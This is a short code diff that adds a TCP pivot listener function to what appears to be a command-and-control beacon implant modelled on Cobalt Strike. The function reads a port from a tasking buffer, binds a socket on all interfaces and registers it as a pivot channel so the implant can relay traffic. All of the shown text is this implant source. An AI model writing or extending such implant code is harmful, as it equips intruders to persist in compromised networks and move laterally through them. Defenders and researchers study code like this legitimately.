@@ -110,3 +110,21 @@ void ChannelLSocketBind(char* buffer, int length, int ipAddress)
 	int newId = ChannelGetId();
 	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_BIND, port, CHANNEL_STATE_2);
 }
+
+void ChannelLSocketTcpPivot(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	short port = BeaconDataShort(&parser);
+	SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 10);
+	if (sock == INVALID_SOCKET)
+	{
+		LERROR("Could not bind to %d", port);
+		BeaconErrorD(ERROR_SOCKET_CREATE_BIND_FAILED, port);
+		return;
+	}
+
+	int newId = ChannelGetId();
+	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_TCP_PIVOT, port, CHANNEL_STATE_2);
+}
+
